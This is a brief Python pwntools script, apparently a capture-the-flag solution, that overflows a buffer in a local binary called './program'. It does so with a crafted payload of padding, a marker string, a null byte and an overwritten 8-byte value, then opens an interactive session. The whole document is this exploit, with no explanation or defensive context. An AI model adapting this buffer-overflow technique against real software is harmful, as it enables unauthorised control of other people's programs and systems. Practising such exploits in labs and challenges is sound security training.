```py
from pwn import * 

p = process("./program")

payload = b'UwUUwU' + b'A' * 74 + b'nothing' + b'\0' + b'A' * 16 + b'A' * 8 + p64(0xabfefefefefefefe)

p.sendline(payload)

p.interactive()
```

